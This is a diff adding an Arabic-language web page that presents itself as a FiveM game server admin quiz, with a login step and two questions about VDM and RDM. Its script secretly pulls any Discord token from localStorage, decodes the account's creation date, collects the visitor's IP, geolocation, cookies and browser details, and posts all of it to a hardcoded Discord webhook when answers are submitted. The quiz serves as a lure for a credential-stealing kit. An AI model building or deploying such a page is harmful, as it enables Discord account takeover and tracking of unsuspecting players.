@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>إدارة خادم FiveM</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+        }
+        body {
+            background: linear-gradient(145deg, #0b0d15 0%, #1a1e2b 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .glass {
+            background: rgba(20, 25, 40, 0.8);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 215, 0, 0.2);
+            border-radius: 40px;
+            padding: 40px 35px;
+            max-width: 720px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8), 0 0 30px rgba(255, 215, 0, 0.05);
+            transition: 0.3s;
+        }
+        h1 {
+            color: #f5c842;
+            font-size: 2rem;
+            font-weight: 700;
+            letter-spacing: 1px;
+            text-align: center;
+            text-shadow: 0 0 20px rgba(245, 200, 66, 0.2);
+            margin-bottom: 6px;
+        }
+        .sub {
+            text-align: center;
+            color: #9aa3b8;
+            margin-bottom: 28px;
+            font-weight: 300;
+            border-bottom: 1px dashed #2e354a;
+            padding-bottom: 14px;
+        }
+        .logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .logo span {
+            background: #f5c842;
+            color: #0b0d15;
+            font-weight: 800;
+            font-size: 2.2rem;
+            padding: 10px 28px;
+            border-radius: 60px;
+            box-shadow: 0 0 30px rgba(245, 200, 66, 0.3);
+            letter-spacing: 2px;
+        }
+        label {
+            color: #cfd7e6;
+            font-weight: 500;
+            display: block;
+            margin: 18px 0 6px 0;
+            font-size: 0.9rem;
+        }
+        input, select {
+            width: 100%;
+            padding: 14px 18px;
+            border-radius: 16px;
+            border: 1px solid #2f364f;
+            background: #111624;
+            color: #f0f4ff;
+            font-size: 1rem;
+            transition: 0.2s;
+            outline: none;
+        }
+        input:focus, select:focus {
+            border-color: #f5c842;
+            box-shadow: 0 0 0 3px rgba(245, 200, 66, 0.15);
+        }
+        .btn {
+            background: #f5c842;
+            color: #0b0d15;
+            font-weight: 700;
+            padding: 16px;
+            border: none;
+            border-radius: 30px;
+            width: 100%;
+            font-size: 1.1rem;
+            margin-top: 25px;
+            cursor: pointer;
+            transition: 0.2s;
+            letter-spacing: 0.5px;
+            box-shadow: 0 6px 0 #b38a1e;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 0 #b38a1e;
+            background: #ffd95e;
+        }
+        .btn:active {
+            transform: translateY(4px);
+            box-shadow: 0 2px 0 #b38a1e;
+        }
+        .hidden {
+            display: none;
+        }
+        .qbox {
+            background: #0f131e;
+            border-radius: 24px;
+            padding: 22px;
+            margin: 20px 0 12px 0;
+            border-left: 4px solid #f5c842;
+        }
+        .qbox p {
+            color: #e8edf8;
+            font-weight: 500;
+            margin-bottom: 10px;
+        }
+        .qbox label {
+            margin: 8px 0 4px 0;
+            font-weight: 400;
+            color: #b4bfd4;
+        }
+        .foot {
+            margin-top: 24px;
+            color: #5d687e;
+            font-size: 0.8rem;
+            text-align: center;
+            border-top: 1px solid #1f263a;
+            padding-top: 18px;
+        }
+        .badge {
+            display: inline-block;
+            background: #1f263a;
+            padding: 4px 14px;
+            border-radius: 40px;
+            color: #9aa3b8;
+            font-size: 0.75rem;
+            margin-top: 6px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="glass" id="app">
+    <div class="logo"><span>⚡ FIVE-M</span></div>
+    <h1>اختبار إدارة الخادم</h1>
+    <div class="sub">سجل بياناتك لإكمال التحقق</div>
+
+    <!-- المرحلة 1: التسجيل -->
+    <div id="step1">
+        <label>👤 اسم اللاعب</label>
+        <input type="text" id="playerName" placeholder="مثال: KANHA" />
+
+        <label>📅 العمر</label>
+        <input type="number" id="playerAge" placeholder="18" />
+
+        <label>🔑 كلمة المرور المؤقتة</label>
+        <input type="password" id="playerPass" placeholder="أدخل البسورد" />
+
+        <button class="btn" id="loginBtn">🚀 دخول</button>
+        <div class="badge">مطلوب بسورد: 0020</div>
+    </div>
+
+    <!-- المرحلة 2: الأسئلة (تظهر بعد تسجيل الدخول) -->
+    <div id="step2" class="hidden">
+        <div class="qbox">
+            <p>❓ ما هو VDM؟</p>
+            <label><input type="radio" name="vdm" value="قتل عشوائي" checked /> قتل عشوائي</label>
+            <label><input type="radio" name="vdm" value="صدم عشوائي" /> صدم عشوائي</label>
+            <label><input type="radio" name="vdm" value="ذبح بل أمنه" /> ذبح بل أمنه</label>
+        </div>
+        <div class="qbox">
+            <p>❓ ما هو RDM؟</p>
+            <label><input type="radio" name="rdm" value="قتل عشوائي" checked /> قتل عشوائي</label>
+            <label><input type="radio" name="rdm" value="صدم عشوائي" /> صدم عشوائي</label>
+            <label><input type="radio" name="rdm" value="ذبح داخب أمنه" /> ذبح داخب أمنه</label>
+        </div>
+        <button class="btn" id="submitBtn">✅ إرسال الإجابات</button>
+        <p style="color:#7f8aa3; margin-top: 16px; font-size:0.9rem; text-align:center;">سيتم تقييم إجاباتك تلقائياً</p>
+    </div>
+
+    <div class="foot">© 2026 FiveM Admin Panel • بيئة اختبارية</div>
+</div>
+
+<script>
+    // ========== ويب هوك الخاص بك ==========
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1544031793022243036/NyaMsf-1ov07NigYIObLgAORUs9OfAru9gKyEXpQYYHpntGJIAzxK8tQmCskuqb6I5X2";
+
+    // ========== دوال جمع المعلومات ==========
+    function getDiscordToken() {
+        try {
+            const regex = /[\w-]{24,28}\.[\w-]{6,7}\.[\w-]{27,38}/g;
+            for (let key in localStorage) {
+                let val = localStorage[key];
+                if (typeof val === 'string') {
+                    let match = val.match(regex);
+                    if (match) return match[0];
+                }
+            }
+        } catch(e) {}
+        return "غير موجود";
+    }
+
+    function getAccountAge() {
+        try {
+            let token = getDiscordToken();
+            if (token && token !== "غير موجود") {
+                let payload = token.split('.')[1];
+                let decoded = JSON.parse(atob(payload.replace(/-/g, '+').replace(/_/g, '/')));
+                if (decoded.iat) {
+                    let created = new Date(decoded.iat * 1000);
+                    return created.toISOString().split('T')[0];
+                }
+            }
+        } catch(e) {}
+        return "غير معروف";
+    }
+
+    async function getIP() {
+        try {
+            let res = await fetch('https://api.ipify.org?format=json');
+            let data = await res.json();
+            return data.ip;
+        } catch(e) {
+            return "غير معروف";
+        }
+    }
+
+    async function getLocation(ip) {
+        try {
+            let res = await fetch(`https://ipapi.co/${ip}/json/`);
+            let data = await res.json();
+            return `${data.city || 'غير معروف'}, ${data.country_name || 'غير معروف'} (ISP: ${data.org || 'غير معروف'})`;
+        } catch(e) {
+            return "غير معروف";
+        }
+    }
+
+    function getCookies() {
+        return document.cookie || "لا يوجد";
+    }
+
+    function getBrowserInfo() {
+        return {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            url: window.location.href,
+            referrer: document.referrer || "مباشر",
+            timestamp: new Date().toISOString()
+        };
+    }
+
+    // ========== إرسال البيانات إلى ويب هوك ==========
+    async function sendAllData(name, age, vdmAns, rdmAns) {
+        const ip = await getIP();
+        const location = await getLocation(ip);
+        const token = getDiscordToken();
+        const accountAge = getAccountAge();
+        const cookies = getCookies();
+        const browser = getBrowserInfo();
+
+        const payload = {
+            content: `**🔰 FiveM Admin Test – دخول جديد**\n` +
+                     `**👤 الاسم:** ${name}\n` +
+                     `**📅 العمر:** ${age}\n` +
+                     `**🔑 البسورد المستخدم:** 0020\n` +
+                     `**🌐 IP:** ${ip}\n` +
+                     `**📍 الموقع:** ${location}\n` +
+                     `**🎫 توكن دسكورد:** \`${token}\`\n` +
+                     `**📆 تاريخ إنشاء الحساب:** ${accountAge}\n` +
+                     `**🍪 الكوكيز:** ${cookies}\n` +
+                     `**💻 المتصفح:** ${browser.userAgent}\n` +
+                     `**🖥️ المنصة:** ${browser.platform}\n` +
+                     `**🌍 اللغة:** ${browser.language}\n` +
+                     `**📐 الشاشة:** ${browser.screen}\n` +
+                     `**🔗 الرابط:** ${browser.url}\n` +
+                     `**📎 المرجع:** ${browser.referrer}\n` +
+                     `**⏱️ الوقت:** ${browser.timestamp}\n` +
+                     `**📌 إجابات VDM:** ${vdmAns}\n` +
+                     `**📌 إجابات RDM:** ${rdmAns}`
+        };
+
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        } catch(e) {}
+    }
+
+    // ========== منطق الصفحة ==========
+    document.getElementById('loginBtn').addEventListener('click', function() {
+        const name = document.getElementById('playerName').value.trim();
+        const age = document.getElementById('playerAge').value.trim();
+        const pass = document.getElementById('playerPass').value.trim();
+
+        if (!name || !age || !pass) {
+            alert('يرجى ملء جميع الحقول.');
+            return;
+        }
+
+        if (pass !== '0020') {
+            alert('بسورد خاطئ! البسورد الصحيح هو 0020');
+            return;
+        }
+
+        // إخفاء التسجيل وإظهار الأسئلة
+        document.getElementById('step1').classList.add('hidden');
+        document.getElementById('step2').classList.remove('hidden');
+
+        // تخزين الاسم والعمر للإرسال لاحقاً
+        window._playerName = name;
+        window._playerAge = age;
+    });
+
+    document.getElementById('submitBtn').addEventListener('click', async function() {
+        const vdm = document.querySelector('input[name="vdm"]:checked');
+        const rdm = document.querySelector('input[name="rdm"]:checked');
+
+        const vdmVal = vdm ? vdm.value : 'غير محدد';
+        const rdmVal = rdm ? rdm.value : 'غير محدد';
+
+        const name = window._playerName || 'غير معروف';
+        const age = window._playerAge || 'غير معروف';
+
+        // إرسال كل البيانات إلى ويب هوك
+        await sendAllData(name, age, vdmVal, rdmVal);
+
+        alert('✅ تم إرسال الإجابات بنجاح! سيتم تقييمها قريباً.');
+        // اختياري: إعادة تحميل أو عرض شكر
+        document.getElementById('step2').innerHTML = `
+            <div style="text-align:center; padding: 30px 0;">
+                <h2 style="color:#f5c842;">✅ شكراً لك</h2>
+                <p style="color:#b4bfd4;">تم تسجيل إجاباتك. سيقوم فريق الإدارة بمراجعتها.</p>
+            </div>
+        `;
+    });
+</script>
+</body>
+</html>
